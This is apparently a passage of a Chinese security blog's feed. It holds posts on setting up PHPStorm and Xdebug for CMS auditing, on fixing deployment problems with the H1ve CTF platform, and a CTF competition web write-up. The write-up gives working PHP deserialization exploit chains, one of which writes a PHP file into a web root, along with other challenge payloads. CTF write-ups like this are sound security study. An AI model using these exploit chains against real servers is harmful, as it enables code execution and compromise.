rel="noopener">https://www.freebuf.com/column/161703.html</a></p><p><a href="https://www.cnblogs.com/zpchcbd/p/12741373.html" target="_blank" rel="noopener">https://www.cnblogs.com/zpchcbd/p/12741373.html</a></p>]]></content>
    
    <summary type="html">
    
      开始学习审计CMS
    
    </summary>
    
    
      <category term="代码审计" scheme="https://0xcreed.jxustctf.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="PHP" scheme="https://0xcreed.jxustctf.top/tags/PHP/"/>
    
      <category term="CMS" scheme="https://0xcreed.jxustctf.top/tags/CMS/"/>
    
  </entry>
  
  <entry>
    <title>phpstrom+xdebug调试代码</title>
    <link href="https://0xcreed.jxustctf.top/2021/01/phpstrom-xdebug%E8%B0%83%E8%AF%95%E4%BB%A3%E7%A0%81/"/>
    <id>https://0xcreed.jxustctf.top/2021/01/phpstrom-xdebug%E8%B0%83%E8%AF%95%E4%BB%A3%E7%A0%81/</id>
    <published>2021-01-19T10:39:28.000Z</published>
    <updated>2021-07-27T00:54:56.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>​        接下来想审计几个开源的cms，工欲善其事必先利其器，这里我用的是phpstrom+xdebug+phpstudy的组合。安装phpstrom和phpstudy这个不多说。</p><h3 id="phpstudy"><a href="#phpstudy" class="headerlink" title="phpstudy"></a>phpstudy</h3><p>​        注意这里不要使用apache作为中间件，这样会导致调试过程中会话丢失(大概1分钟不到)。</p><a id="more"></a><p>后来发现其实是phpstudy的apache默认配置问题，修改一下就行</p><p><img src="/2021/01/phpstrom-xdebug调试代码/image-20210727084808790.png" alt="image-20210727084808790"></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;IfModule</span> <span class="string">mod_fcgid.c&gt;</span></span><br><span class="line"><span class="comment"># php-cgi进程的生存时间</span></span><br><span class="line">true<span class="attr">FcgidProcessLifeTime</span> <span class="string">9999</span></span><br><span class="line"><span class="comment"># php-cgi进程IO超时时间</span></span><br><span class="line">    <span class="attr">FcgidIOTimeout</span> <span class="string">9999</span></span><br><span class="line"><span class="comment"># php-cgi进程连接超时时间</span></span><br><span class="line">    <span class="attr">FcgidConnectTimeout</span> <span class="string">9999</span></span><br><span class="line"><span class="comment"># 上传文件的最大尺寸 100MB</span></span><br><span class="line">true<span class="attr">FcgidMaxRequestLen</span> <span class="string">104857600</span></span><br><span class="line"><span class="comment"># php-cgi最大的进程数</span></span><br><span class="line"><span class="comment"># FcgidMaxProcesses 5</span></span><br><span class="line"><span class="attr">&lt;/IfModule&gt;</span></span><br></pre></td></tr></table></figure><p>先启动nginx和mysql</p><p><img src="/2021/01/phpstrom-xdebug调试代码/image-20210119185312944.png" alt="image-20210119185312944"></p><p>再新建网站</p><p><img src="/2021/01/phpstrom-xdebug调试代码/image-20210119190147445.png" alt="image-20210119190147445"></p><p>这个默认配置就行，注意使用<strong>cms推荐的php版本</strong>。</p><p>打开网站能正常访问就行。</p><p>同时在 管理-&gt;php扩展-&gt; 勾选xdebug</p><p>打开对应版本的php.ini文件</p><p>在<code>[xdebug]</code>项添加idekey和打开远程调试</p><p><img src="/2021/01/phpstrom-xdebug调试代码/image-20210121121958881.png" alt="image-20210121121958881"></p><h3 id="phpstorm"><a href="#phpstorm" class="headerlink" title="phpstorm"></a>phpstorm</h3><p>​        将网站根目录作为项目打开</p><p>打开设置选择php版本</p><p><img src="/2021/01/phpstrom-xdebug调试代码/image-20210119191031796.png" alt="image-20210119191031796"></p><p>下拉php列表</p><p>配置服务器和phpstudy相同就行</p><p><img src="/2021/01/phpstrom-xdebug调试代码/image-20210119191134264.png" alt="image-20210119191134264"></p><p>下拉调试</p><p>选择DBGp代理</p><p><img src="/2021/01/phpstrom-xdebug调试代码/image-20210119191229837.png" alt="image-20210119191229837"></p><p>这里要注意的是这三个值要和php.ini中的对应</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">xdebug.idekey</span>=PHPSTORM </span><br><span class="line"><span class="attr">xdebug.remote_host</span>=localhost </span><br><span class="line"><span class="attr">xdebug.remote_port</span>=<span class="number">9000</span></span><br></pre></td></tr></table></figure><p>在phpstorm 右上角添加配置</p><p>选择php web页面</p><p><img src="/2021/01/phpstrom-xdebug调试代码/image-20210119191734997.png" alt="image-20210119191734997"></p><p>点击 验证测试xdebug没问题</p><p><img src="/2021/01/phpstrom-xdebug调试代码/image-20210119191827554.png" alt="image-20210119191827554"></p><h3 id="浏览器安装Xdebug-helper"><a href="#浏览器安装Xdebug-helper" class="headerlink" title="浏览器安装Xdebug helper"></a>浏览器安装Xdebug helper</h3><p><img src="/2021/01/phpstrom-xdebug调试代码/image-20210119192132260.png" alt="image-20210119192132260"></p><p>在扩展选项中填写IDE key</p><p><img src="/2021/01/phpstrom-xdebug调试代码/image-20210119192225930.png" alt="image-20210119192225930"></p><h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>先下好断点</p><p>然后点击监听</p><p><img src="/2021/01/phpstrom-xdebug调试代码/image-20210119192018629.png" alt="image-20210119192018629"></p><p>Shift+F10 运行</p><p>接着在浏览器将Xdebug helper选择debug模式</p><p><img src="/2021/01/phpstrom-xdebug调试代码/image-20210119192710255.png" alt="image-20210119192710255"></p><p>再去触发相应的代码，就能在断点处停下了</p><p><img src="/2021/01/phpstrom-xdebug调试代码/image-20210119193010239.png" alt="image-20210119193010239"></p><p>接下来可以愉快的调试了！</p><p>对于运行在5.4及其以上的cms，调试时可以不使用phpstudy(需要xdebug插件),在右上角添加配置时选择php内置服务器即可</p><p><img src="/2021/01/phpstrom-xdebug调试代码/image-20210119194552083.png" alt="image-20210119194552083"></p><p>这里是自己起了php监听，可以看到访问的请求，两种运行方法各有优劣。</p><p>后面又发现个问题</p><p>调试时会遇到debug会话未暂停的警告</p><p><img src="/2021/01/phpstrom-xdebug调试代码/image-20210119194221935.png" alt="image-20210119194221935"></p><p>调试的网页也会报一个404错误，会影响后续的调试。</p><p>各种切换版本，修改配置，搜索引擎等操作，还是找不到解决办法。(救救孩子</p><p>所以打算弃了phpstudy，改用wsl2作为调试环境(我太难了)</p><p>后面发现，别偷懒直接设置在脚本第一行调试即可</p><p><img src="/2021/01/phpstrom-xdebug调试代码/image-20210727085451391.png" alt="image-20210727085451391"></p><h3 id="WSL2管理多版本php"><a href="#WSL2管理多版本php" class="headerlink" title="WSL2管理多版本php"></a>WSL2管理多版本php</h3><p>作为一个调试环境，如果只有一个php版本无疑是失败的！</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo<span class="built_in"> add-apt-repository </span>ppa:ondrej/php    //添加仓库源</span><br><span class="line">sudo apt-get update  //更新源</span><br><span class="line">sudo apt-get install php5.6  //安装其他版本php</span><br><span class="line">sudo apt-get install php5.6-xdebug        //安装必须的插件</span><br><span class="line">sudo apt-get install php5.6-mysql</span><br><span class="line"><span class="keyword">.</span>..</span><br></pre></td></tr></table></figure><p>更多内容参考这篇<a href="https://justcode.ikeepstudying.com/2018/11/%E5%AE%89%E8%A3%85%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%AC%E7%9A%84php-php%E5%A4%9A%E7%89%88%E6%9C%AC%E5%AE%89%E8%A3%85-how-to-install-different-php-5-6-7-0-and-7-1-versions-in-ubuntu/" target="_blank" rel="noopener">文章</a></p><p>如果是kali等debian系可以参考一下命令</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt -y install lsb-<span class="keyword">release</span> apt-transport-https ca-certificates </span><br><span class="line">sudo wget -O /etc/apt/<span class="keyword">trusted</span>.gpg.d/php.gpg https://packages.sury.org/php/apt.gpg</span><br><span class="line">echo "deb https://packages.sury.org/php/ buster main" | sudo tee /etc/apt/sources.list.d/php.list</span><br></pre></td></tr></table></figure><h3 id="修改php-ini文件"><a href="#修改php-ini文件" class="headerlink" title="修改php.ini文件"></a>修改php.ini文件</h3><p><img src="/2021/01/phpstrom-xdebug调试代码/image-20210123221353899.png" alt="image-20210123221353899"></p><p>添加 [xdebug]</p><p><img src="/2021/01/phpstrom-xdebug调试代码/image-20210123224346250.png" alt="image-20210123224346250">，</p><p>这里要注意</p><p><strong>1.remote_host要填win10的wsl的ip，wsl不能直接通过localhost访问win10的端口</strong></p><p><strong>2.在win10防火墙的出站规则中把公用域的两个配置改成允许连接</strong></p><p><img src="/2021/01/phpstrom-xdebug调试代码/image-20210123232107298.png" alt="image-20210123232107298"></p><p>太草了，不是这个xdebug.log一辈子翻不了案</p><p><img src="/2021/01/phpstrom-xdebug调试代码/image-20210123222005027.png" alt="image-20210123222005027"></p><h3 id="PHPSTORM添加运行环境"><a href="#PHPSTORM添加运行环境" class="headerlink" title="PHPSTORM添加运行环境"></a>PHPSTORM添加运行环境</h3><p>这里的配置和上面一样，我就贴个图把</p><p><img src="/2021/01/phpstrom-xdebug调试代码/image-20210123222129044.png" alt="image-20210123222129044"></p><p><img src="/2021/01/phpstrom-xdebug调试代码/image-20210123222154726.png" alt="image-20210123222154726"></p><p><img src="/2021/01/phpstrom-xdebug调试代码/image-20210123222219179.png" alt="image-20210123222219179"></p><p>运行 监听 浏览器开启xdebug</p><p><img src="/2021/01/phpstrom-xdebug调试代码/image-20210123222337715.png" alt="image-20210123222337715"></p><p><img src="/2021/01/phpstrom-xdebug调试代码/image-20210123222355580.png" alt="image-20210123222355580"></p><p>心累- -！</p><p>还有个问题就是每次重启后win10的wsl网域会变化，所以xdebug的配置也要跟着变化</p><p>这里可以考虑把wsl设置为静态IP，但我的解决方案是写个脚本修改xdebug的配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">ip=$(cat /etc/resolv.conf | grep nameserver |awk <span class="string">'&#123;print $2&#125;'</span>)</span><br><span class="line"><span class="comment">#echo $ip</span></span><br><span class="line">sudo sed -i  <span class="string">"/^xdebug.remote_host/cxdebug.remote_host=<span class="variable">$ip</span>"</span> /etc/php/5.6/cli/php.ini</span><br></pre></td></tr></table></figure><p>另外一个解决办法是在php.ini</p><p>添加 <code>xdebug.remote_connect_back = 1</code> //如果开启，将忽略 xdebug.remote_host 的参数。它会根据访问的ip直接回连</p>]]></content>
    
    <summary type="html">
    
      配置php代码审计的环境，挺折磨的！
    
    </summary>
    
    
      <category term="环境搭建" scheme="https://0xcreed.jxustctf.top/categories/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    
    
      <category term="调试" scheme="https://0xcreed.jxustctf.top/tags/%E8%B0%83%E8%AF%95/"/>
    
      <category term="phpstorm" scheme="https://0xcreed.jxustctf.top/tags/phpstorm/"/>
    
  </entry>
  
  <entry>
    <title>H1ve搭建问题</title>
    <link href="https://0xcreed.jxustctf.top/2021/01/H1ve%E6%90%AD%E5%BB%BA%E9%97%AE%E9%A2%98/"/>
    <id>https://0xcreed.jxustctf.top/2021/01/H1ve%E6%90%AD%E5%BB%BA%E9%97%AE%E9%A2%98/</id>
    <published>2021-01-07T06:58:00.000Z</published>
    <updated>2021-01-19T12:41:10.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="1-找不到PWD"><a href="#1-找不到PWD" class="headerlink" title="1.找不到PWD"></a>1.找不到PWD</h3><p><img src="/2021/01/H1ve搭建问题/image-20210107150823208.png" alt="image-20210107150823208"></p><p>H1ve的版本是1.1.3</p><p>使用</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">docker-compose</span> <span class="selector-tag">-f</span> <span class="selector-tag">single</span><span class="selector-class">.yml</span> <span class="selector-tag">up</span></span><br></pre></td></tr></table></figure><p><img src="/2021/01/H1ve搭建问题/image-20210107151152146.png" alt="image-20210107151152146"></p><p>这里警告PWD未定义，所以我们在项目下创建<code>.env</code>定义一下就行</p><p><img src="/2021/01/H1ve搭建问题/image-20210107151304373.png" alt="image-20210107151304373"></p><h3 id="2-访问过慢"><a href="#2-访问过慢" class="headerlink" title="2.访问过慢"></a>2.访问过慢</h3><p>这个问题其实是个css文件引起的，引用的这个css文件的域名被墙了 - -！</p><p>导致这个问题后面偶然才发现的</p><p><img src="/2021/01/H1ve搭建问题/image-20210107153325242.png" alt="image-20210107153325242"></p><p>我的解决办法是把<code>all.css</code>下载下来放到服务器上，再修改引用的URL</p><a id="more"></a><p><img src="/2021/01/H1ve搭建问题/image-20210107153828399.png" alt="image-20210107153828399"></p><p>然后修改fontawesome-fonts.css </p><p><img src="/2021/01/H1ve搭建问题/image-20210107154100385.png" alt="image-20210107154100385"></p><p><img src="/2021/01/H1ve搭建问题/image-20210107154343809.png" alt="image-20210107154343809"></p><h3 id="3-redis缓存不释放，页面500"><a href="#3-redis缓存不释放，页面500" class="headerlink" title="3.redis缓存不释放，页面500"></a>3.redis缓存不释放，页面500</h3><p>这个bug官方还没修复，所以只能自己修复</p><p>利用这个工具清理过期的redis缓存<a href="https://github.com/emacsist/redis-con-release" target="_blank" rel="noopener">https://github.com/emacsist/redis-con-release</a></p><p>但是这个工具是一天清除一次，本来想重写build的，但是有些包丢失了</p><p>所以就写了个脚本</p><p>kill.sh</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">        <span class="built_in">cd</span> / &amp;&amp; timeout 5 ./app-linux-amd64 &amp;&amp; sleep 600</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><p>获取容器id</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker container <span class="keyword">ps</span> |<span class="keyword">grep</span> redis</span><br></pre></td></tr></table></figure><p><img src="/2021/01/H1ve搭建问题/image-20210107155615543.png" alt="image-20210107155615543"></p><p>把工具、脚本复制到容器</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo docker <span class="keyword">cp</span> ./app-linux-amd64   <span class="number">1</span>dc:/</span><br><span class="line">sudo docker <span class="keyword">cp</span> ./app.json  <span class="number">1</span>dc:/</span><br><span class="line">sudo docker <span class="keyword">cp</span> ./kill.<span class="keyword">sh</span>   <span class="number">1</span>dc:/</span><br></pre></td></tr></table></figure><p>进入容器，执行脚本</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo docker exec -it 1dc  <span class="string">/bin/bash</span></span><br><span class="line"><span class="keyword">cd</span> /</span><br><span class="line">nohup <span class="string">./kill.sh</span> &amp;</span><br></pre></td></tr></table></figure><p>当然脚本也可以根据需求修改</p>]]></content>
    
    <summary type="html">
    
      记录下搭建H1ve时遇到的问题
    
    </summary>
    
    
      <category term="CTF" scheme="https://0xcreed.jxustctf.top/categories/CTF/"/>
    
    
      <category term="CTF平台" scheme="https://0xcreed.jxustctf.top/tags/CTF%E5%B9%B3%E5%8F%B0/"/>
    
  </entry>
  
  <entry>
    <title>第十三届全国大学生信息安全竞赛初赛Writeup</title>
    <link href="https://0xcreed.jxustctf.top/2020/08/%E7%AC%AC%E5%8D%81%E4%B8%89%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/"/>
    <id>https://0xcreed.jxustctf.top/2020/08/%E7%AC%AC%E5%8D%81%E4%B8%89%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/</id>
    <published>2020-08-24T01:06:46.000Z</published>
    <updated>2020-08-24T07:46:08.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="babyunserialize"><a href="#babyunserialize" class="headerlink" title="babyunserialize"></a>babyunserialize</h3><p>扫目录拿源码</p><p><img src="/2020/08/第十三届全国大学生信息安全竞赛初赛Writeup/image-20200824112713676.png" alt="image-20200824112713676"></p><p>wmctf2020 <a href="http://blog.ccreater.top/2020/08/04/wmctf2020/#webweb" target="_blank" rel="noopener">webweb的原题</a>，直接用exp打</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DB</span>&#123;</span><br><span class="line">  <span class="title">abstract</span> <span class="title">class</span> <span class="title">Cursor</span> <span class="title">implements</span> \<span class="title">IteratorAggregate</span> &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title">namespace</span> <span class="title">DB</span>\<span class="title">SQL</span>&#123;</span><br><span class="line">  <span class="title">class</span> <span class="title">Mapper</span> <span class="title">extends</span> \<span class="title">DB</span>\<span class="title">Cursor</span>&#123;</span><br><span class="line">    <span class="title">protected</span></span><br><span class="line">      $<span class="title">props</span>=["<span class="title">quotekey</span>"=&gt;"<span class="title">call_user_func</span>"],</span><br><span class="line">      $<span class="title">adhoc</span>=["<span class="title">phpinfo</span>"=&gt;["<span class="title">expr</span>"=&gt;""]],</span><br><span class="line">      $<span class="title">db</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">offsetExists</span><span class="params">($offset)</span></span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">offsetGet</span><span class="params">($offset)</span></span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">offsetSet</span><span class="params">($offset, $value)</span></span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">offsetUnset</span><span class="params">($offset)</span></span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getIterator</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($val)</span></span>&#123;</span><br><span class="line">      <span class="keyword">$this</span>-&gt;db = $val;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">CLI</span>&#123;</span><br><span class="line">  <span class="title">class</span> <span class="title">Agent</span> &#123;</span><br><span class="line">    <span class="title">protected</span> $<span class="title">server</span>="";</span><br><span class="line">    <span class="keyword">public</span> $events;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">      <span class="keyword">$this</span>-&gt;events=[<span class="string">"disconnect"</span>=&gt;<span class="keyword">array</span>(<span class="keyword">new</span> \DB\SQL\Mapper(<span class="keyword">new</span> \DB\SQL\Mapper(<span class="string">""</span>)),<span class="string">"find"</span>)];</span><br><span class="line">      <span class="keyword">$this</span>-&gt;server=&amp;<span class="keyword">$this</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">WS</span></span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">  <span class="title">echo</span> <span class="title">urlencode</span>(<span class="title">serialize</span>(<span class="title">array</span>(<span class="title">new</span> \<span class="title">CLI</span>\<span class="title">WS</span>(),<span class="title">new</span> \<span class="title">CLI</span>\<span class="title">Agent</span>())));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><a id="more"></a><p><a href="https://www.gem-love.com/ctf/2569.html#babyunserialize" target="_blank" rel="noopener">y1ng师傅</a>是全局搜索<code>__destruct()</code>，在jig.php发现了任意写，于是直接gethell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DB</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Jig</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span></span><br><span class="line">        FORMAT_JSON=<span class="number">0</span>,</span><br><span class="line">        FORMAT_Serialized=<span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span></span><br><span class="line">        <span class="comment">//! Storage location</span></span><br><span class="line">        $dir = <span class="string">'/var/www/html/'</span>,</span><br><span class="line">        <span class="comment">//! Current storage format</span></span><br><span class="line">        $format = <span class="keyword">self</span>::FORMAT_JSON,</span><br><span class="line">        <span class="comment">//! Jig log</span></span><br><span class="line">        $data = <span class="keyword">array</span>(<span class="string">"info.php"</span>=&gt;<span class="keyword">array</span>(<span class="string">"a"</span>=&gt;<span class="string">"&lt;?php phpinfo();?&gt;"</span>)),</span><br><span class="line">        <span class="comment">//! lazy load/save files</span></span><br><span class="line">        $lazy = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">$jig = <span class="keyword">new</span> Jig();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($jig));</span><br></pre></td></tr></table></figure><h3 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//题目环境：php:7.4.8-apache</span></span><br><span class="line">    $pid = pcntl_fork();</span><br><span class="line">    <span class="keyword">if</span> ($pid == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'could not fork'</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span> ($pid)&#123;</span><br><span class="line">        $r=pcntl_wait($status);</span><br><span class="line">        <span class="keyword">if</span>(!pcntl_wifexited($status))&#123;</span><br><span class="line">            phpinfo();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'a'</span>])&amp;&amp;is_string($_GET[<span class="string">'a'</span>])&amp;&amp;!preg_match(<span class="string">"/[:\\\\]|exec|pcntl/i"</span>,$_GET[<span class="string">'a'</span>]))&#123;</span><br><span class="line">            call_user_func_array($_GET[<span class="string">'a'</span>],[$_GET[<span class="string">'b'</span>],<span class="keyword">false</span>,<span class="keyword">true</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        posix_kill(posix_getpid(), SIGUSR1);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>php多进程，主进程会等待子进程运行结束，子进程异常退出会触发<code>phpinfo()</code>。<br>直接拿php函数列表fuzz。</p><p><img src="/2020/08/第十三届全国大学生信息安全竞赛初赛Writeup/easyphp.jpg" alt="easyphp"></p><p>以上函数均可导致子进程异常退出，随便找一个即可。</p><p>payload：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">a</span>=fsockopen&amp;b=123</span><br></pre></td></tr></table></figure><p>本来想自己fuzz一下的，但环境没了。</p><h3 id="easytrick"><a href="#easytrick" class="headerlink" title="easytrick"></a>easytrick</h3><p>要求两个变量长度不能超过5，但md5的值又要相同，而且强弱比较也不能相同</p><p>考脑洞</p><p>利用php预定义常量绕过</p><p>比如 M_PI,M_E ,INF,M_LN2</p><p><img src="/2020/08/第十三届全国大学生信息安全竞赛初赛Writeup/image-20200821142717774.png" alt="image-20200821142717774"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">trick</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $trick1=INF;</span><br><span class="line"><span class="keyword">public</span> $trick2=INF;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> trick()) );</span><br></pre></td></tr></table></figure><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">trick=O%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span>trick%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>trick1%<span class="number">22</span>%<span class="number">3</span>Bd%<span class="number">3</span>AINF%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>t</span><br><span class="line">rick2%<span class="number">22</span>%<span class="number">3</span>Bd%<span class="number">3</span>AINF%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure><h3 id="littlegame"><a href="#littlegame" class="headerlink" title="littlegame"></a>littlegame</h3><p>在<code>/DeveloperControlPanel</code>路由中发现</p><p>if(Admin[key] === password) 才能得到flag</p><p>在 <code>/Privilege</code>下，利用setFn设置值</p><p><img src="/2020/08/第十三届全国大学生信息安全竞赛初赛Writeup/image-20200821144143013.png" alt="image-20200821144143013"></p><p>然后找了下set-value的漏洞，发现一个原型链污染</p><p><img src="/2020/08/第十三届全国大学生信息安全竞赛初赛Writeup/image-20200821143721692.png" alt="image-20200821143721692"></p><p>而3.0.0 正好收到影响</p><p><img src="/2020/08/第十三届全国大学生信息安全竞赛初赛Writeup/image-20200820173333614.png" alt="image-20200820173333614"></p><p><img src="/2020/08/第十三届全国大学生信息安全竞赛初赛Writeup/image-20200820173350849.png" alt="image-20200820173350849"></p><h3 id="rceme"><a href="#rceme" class="headerlink" title="rceme"></a>rceme</h3><h3 id="rceme-1"><a href="#rceme-1" class="headerlink" title="rceme"></a>rceme</h3><p>zzzphp的一个命令执行的漏洞，但<code>danger_key()</code> 增加了一个<code>htmlspecialchars()</code>函数导致原本的payload失效</p><p><img src="/2020/08/第十三届全国大学生信息安全竞赛初赛Writeup/image-20200821144836357.png" alt="image-20200821144836357"></p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span 